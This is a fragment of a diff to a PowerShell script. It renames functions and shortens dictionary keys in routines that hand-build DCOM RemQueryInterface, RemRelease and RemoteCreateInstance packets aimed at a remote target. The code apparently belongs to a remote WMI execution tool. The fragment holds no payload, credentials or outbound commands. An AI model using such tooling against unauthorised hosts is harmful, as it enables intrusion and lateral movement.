-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMinor",[Byte[]](0x07,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Flags",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_CausalityID",$packet_causality_ID)
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IPID",$packet_IPID)
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Refs",[Byte[]](0x05,0x00,0x00,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IIDs",[Byte[]](0x01,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Unknown",[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IID",$packet_IID)
+    $packet_DCOMRemQueryInterface.Add("VersionMajor",[Byte[]](0x05,0x00))
+    $packet_DCOMRemQueryInterface.Add("VersionMinor",[Byte[]](0x07,0x00))
+    $packet_DCOMRemQueryInterface.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemQueryInterface.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemQueryInterface.Add("CausalityID",$packet_causality_ID)
+    $packet_DCOMRemQueryInterface.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemQueryInterface.Add("IPID",$packet_IPID)
+    $packet_DCOMRemQueryInterface.Add("Refs",[Byte[]](0x05,0x00,0x00,0x00))
+    $packet_DCOMRemQueryInterface.Add("IIDs",[Byte[]](0x01,0x00))
+    $packet_DCOMRemQueryInterface.Add("Unknown",[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
+    $packet_DCOMRemQueryInterface.Add("IID",$packet_IID)
 
     return $packet_DCOMRemQueryInterface
 }
 
-function Get-PacketDCOMRemRelease()
+function New-PacketDCOMRemRelease
 {
     param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IPID2)
 
     $packet_DCOMRemRelease = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_VersionMajor",[Byte[]](0x05,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_VersionMinor",[Byte[]](0x07,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_CausalityID",$packet_causality_ID)
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_Unknown",[Byte[]](0x02,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_InterfaceRefs",[Byte[]](0x02,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_IPID",$packet_IPID)
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_PublicRefs",[Byte[]](0x05,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_PrivateRefs",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_IPID2",$packet_IPID2)
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_PublicRefs2",[Byte[]](0x05,0x00,0x00,0x00))
-    $packet_DCOMRemRelease.Add("DCOMRemRelease_PrivateRefs2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("VersionMajor",[Byte[]](0x05,0x00))
+    $packet_DCOMRemRelease.Add("VersionMinor",[Byte[]](0x07,0x00))
+    $packet_DCOMRemRelease.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("CausalityID",$packet_causality_ID)
+    $packet_DCOMRemRelease.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("Unknown",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("InterfaceRefs",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("IPID",$packet_IPID)
+    $packet_DCOMRemRelease.Add("PublicRefs",[Byte[]](0x05,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("PrivateRefs",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("IPID2",$packet_IPID2)
+    $packet_DCOMRemRelease.Add("PublicRefs2",[Byte[]](0x05,0x00,0x00,0x00))
+    $packet_DCOMRemRelease.Add("PrivateRefs2",[Byte[]](0x00,0x00,0x00,0x00))
 
     return $packet_DCOMRemRelease
 }
 
-function Get-PacketDCOMRemoteCreateInstance()
+function New-PacketDCOMRemoteCreateInstance
 {
     param([Byte[]]$packet_causality_ID,[String]$packet_target)
 
@@ -348,135 +347,135 @@ function Get-PacketDCOMRemoteCreateInstance()
     [Byte[]]$packet_property_data_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 56)
 
     $packet_DCOMRemoteCreateInstance = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMajor",[Byte[]](0x05,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMinor",[Byte[]](0x07,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMFlags",[Byte[]](0x01,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMReserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMCausalityID",$packet_causality_ID)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown2",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown3",[Byte[]](0x00,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown4",$packet_cntdata)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCntData",$packet_cntdata)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFIID",[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCLSID",[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFSize",$packet_size)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",$packet_total_size)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",$packet_total_size)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",[Byte[]](0xc0,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",[Byte[]](0x02,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",[Byte[]](0x06,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",[Byte[]](0x68,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",[Byte[]](0x58,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",[Byte[]](0x90,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",$packet_property_data_size)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",[Byte[]](0x20,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",[Byte[]](0x30,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",[Byte[]](0xff,0xff,0xff,0xff))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",[Byte[]](0x02,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",[Byte[]](0x14,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",[Byte[]](0x02,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",[Byte[]](0x14,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",[Byte[]](0x01,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",[Byte[]](0x00,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",[Byte[]](0x58,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",[Byte[]](0x05,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",[Byte[]](0x07,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",[Byte[]](0x60,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",[Byte[]](0x60,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",[Byte[]](0x30,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",$packet_private_header)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",[Byte[]](0x04,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",$packet_target_length)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",$packet_target_length)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",$packet_target_unicode)
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",[Byte[]](0x00,0x00,0x00,0x00))
